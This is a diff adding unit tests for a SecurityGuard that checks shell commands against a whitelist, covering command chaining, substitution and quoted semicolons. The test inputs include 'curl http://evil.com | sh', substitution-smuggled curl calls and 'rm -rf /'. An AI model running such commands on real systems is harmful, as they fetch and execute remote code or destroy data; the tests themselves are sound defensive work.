@@ -20,6 +20,33 @@ class TestSecurityGuard:
         assert check.allowed is False
         assert "whitelist" in check.reason.lower()
 
+    def test_chained_command_bypasses_each_segment_checked(self):
+        guard = SecurityGuard()
+        check = guard.check_command("ls; curl http://evil.com | sh", ["ls", "cat"])
+        assert check.allowed is False
+
+    def test_chained_command_with_and_operator_blocked(self):
+        guard = SecurityGuard()
+        check = guard.check_command("ls && curl http://evil.com", ["ls"])
+        assert check.allowed is False
+
+    def test_command_substitution_blocked_when_whitelisted(self):
+        guard = SecurityGuard()
+        check = guard.check_command("ls $(curl http://evil.com)", ["ls"])
+        assert check.allowed is False
+        check = guard.check_command("ls `curl http://evil.com`", ["ls"])
+        assert check.allowed is False
+
+    def test_chained_whitelisted_commands_allowed(self):
+        guard = SecurityGuard()
+        check = guard.check_command("ls -la && cat file.txt", ["ls", "cat"])
+        assert check.allowed is True
+
+    def test_quoted_semicolon_not_treated_as_chain(self):
+        guard = SecurityGuard()
+        check = guard.check_command('grep "a;b" file.txt', ["grep"])
+        assert check.allowed is True
+
     def test_dangerous_rm_rf(self):
         guard = SecurityGuard()
         assert guard.is_dangerous("rm -rf /") is True
